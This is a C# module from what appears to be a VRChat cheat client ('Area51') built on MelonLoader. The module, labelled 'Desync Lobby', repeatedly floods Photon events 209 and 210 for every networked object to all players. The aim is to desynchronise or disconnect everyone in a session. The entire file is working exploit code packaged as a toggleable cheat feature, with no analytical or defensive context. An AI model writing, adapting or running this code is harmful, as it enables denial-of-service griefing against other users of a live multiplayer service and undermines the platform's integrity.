using Area51.SDK;
using Area51.SDK.ButtonAPI;
using Area51.SDK.Photon;
using ExitGames.Client.Photon;
using MelonLoader;
using Photon.Pun;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using UnityEngine;
using VRC.SDKBase;

namespace Area51.Module.Exploit
{
    class PickupDisconnect : BaseModule
    {
        public PickupDisconnect() : base("Desync", "Desync Lobby", Main.Instance.Eventexploitbutton, null, true) { }

        public override void OnEnable()
        {
            MelonCoroutines.Start(Desync());
        }

        public override void OnDisable()
        {
            MelonCoroutines.Stop(Desync());
        }

        IEnumerator Desync()
        {
            PhotonView[] photonViews = Resources.FindObjectsOfTypeAll<PhotonView>().ToArray();

            while (this.toggled)
            {
                for (int j = 0; j < 3; j++)
                {
                    for (int i = 0; i < photonViews.Length; i++)
                    {
                        PhotonExtensions.OpRaiseEvent(210, new int[]
                        {
                            photonViews[i].viewIdField,
                            VRC.Player.prop_Player_0.prop_VRCPlayerApi_0.playerId
                        }, new Photon.Realtime.RaiseEventOptions
                        {
                            field_Public_ReceiverGroup_0 = Photon.Realtime.ReceiverGroup.All,
                            field_Public_EventCaching_0 = Photon.Realtime.EventCaching.DoNotCache
                        }, default(SendOptions));
                        if (photonViews.Length % 3 == 0)
                            yield return new WaitForSecondsRealtime(0.1f);
                        PhotonExtensions.OpRaiseEvent(209, new int[]
                        {
                            photonViews[i].viewIdField,
                            VRC.Player.prop_Player_0.prop_VRCPlayerApi_0.playerId
                        }, new Photon.Realtime.RaiseEventOptions
                        {
                            field_Public_ReceiverGroup_0 = Photon.Realtime.ReceiverGroup.All,
                            field_Public_EventCaching_0 = Photon.Realtime.EventCaching.DoNotCache
                        }, default(SendOptions));
                    }
                }

                yield return new WaitForEndOfFrame();
            }
            yield break;
        }
    }
}